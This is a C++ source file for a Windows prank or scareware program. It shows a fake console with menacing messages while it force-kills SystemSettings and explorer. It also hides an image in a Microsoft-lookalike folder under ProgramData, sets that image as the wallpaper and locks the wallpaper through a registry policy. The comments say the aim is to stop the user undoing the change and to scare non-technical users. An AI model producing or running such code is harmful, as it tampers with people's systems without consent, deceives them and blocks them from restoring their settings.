#define _CRT_SECURE_NO_WARNINGS
#include <cstdio>
#include <direct.h>
#include <thread>
#include <windows.h>

#include "BlobResource.h"
#include "FakeConsoleWindow.h"
#include "resource.h"
#include "WindowManager.h"

#define SNEAKY_PATH "C:\\ProgramData\\Microsoft Management"
#define WALLPAPER_PATH SNEAKY_PATH "\\icon.png"

// Dev tool for testing without screwing up your wallpaper and killing explorer!
// Uncomment the top line here and comment the bottom line to skip anything annotated with SKIP_IN_DEVMODE.
// Uncomment the bottom line and comment the top line to run everything fully.
#define SKIP_IN_DEVMODE(X)
//#define SKIP_IN_DEVMODE(X) X


// Waits for a certain number of milliseconds while flashing "." ".." "..." in the specified console.
void WaitWithDotDotDot(FakeConsoleWindow& window, DWORD milliseconds)
{
	int dots = 0;
	DWORD timeBetweenDots = 250;
	
	DWORD timePassed = 0;
	DWORD timeSinceLastDot = 0;
	while (timePassed < milliseconds) {
		if (timeSinceLastDot >= timeBetweenDots) {
			if (dots == 3) {
				{
					std::lock_guard<std::mutex> guard(window.text_lock);
					window.text = window.text.substr(0, window.text.length() - 3);
				}
				window.Print(""); // Force Redraw
				dots = 0;
			} else {
				window.Print(".");
				dots++;
			}

			timeSinceLastDot = 0;
		}

		
	    DWORD nextSleepTime = min(timeBetweenDots - timeSinceLastDot, milliseconds - timePassed);
		Sleep(nextSleepTime);
		timeSinceLastDot += nextSleepTime;
		timePassed += nextSleepTime;
	}

	{
		std::lock_guard<std::mutex> guard(window.text_lock);
		window.text = window.text.substr(0, window.text.length() - dots);
	}
	window.Print("\n");
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	BlobResource imageData = BlobResource::LoadResourceById(IDB_PNG1, TEXT("PNG"));

	FakeConsoleWindow console;

	std::thread runnerThread([&]{
		console.Print(">loading setup");
		WindowManager::MinimizeAllThirdPartyWindows();
		WaitWithDotDotDot(console, 5000);

		console.Print(">Corrupting Mind");
		// This line kills settings so that the user cant change the wallpaper after the registry is edited
		WinExec("taskkill /F /IM SystemSettings.exe >nul 2>&1", SW_HIDE);
		WaitWithDotDotDot(console, 1000);
		
		//Hidden folder creation
		_mkdir(SNEAKY_PATH);
		console.Print(">Deleting heretical wallpaper"); //does not actually delete previous wallpaper
		// Sets wallpaper to default, which is color, if color wasnt chosen previously its set to black
		SKIP_IN_DEVMODE(SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)TEXT("SOME INVALID SHIT"), SPIF_UPDATEINIFILE));
		WaitWithDotDotDot(console, 5000);

		imageData.WriteToFile(WALLPAPER_PATH);
		console.Print(">Enthralling desktop wallpaper\n");
		
		// Actually sets wallpaper
		SKIP_IN_DEVMODE(SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)TEXT(WALLPAPER_PATH), SPIF_UPDATEINIFILE));
		Sleep(5000);
		console.Print(">Deleting resistance\n");
		
		// Locks the wallpaper using the registry key
		SKIP_IN_DEVMODE(WinExec("reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f", SW_HIDE));
		
		//pause for effect
		Sleep(1000);
		console.Print(".\n");
		Sleep(1000);
		console.Print(".\n");
		Sleep(1000);
		console.Print(".\n");
		Sleep(1000);
		console.Print(">Done\n");
		Sleep(1000);
		console.Print(">Rebooting in Goddess mode\n");
		//restarts explorer to give a bit of a scare to the user, and making them think it rebooted their system if they arent tech savvy
		SKIP_IN_DEVMODE(WinExec("taskkill /F /IM explorer.exe >nul 2>&1", SW_HIDE));
		Sleep(10000);
		SKIP_IN_DEVMODE(WinExec("explorer", SW_HIDE));
		Sleep(5000);

		console.QuitEverything();
	});
	
	MSG msg = { };
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	runnerThread.join();
}
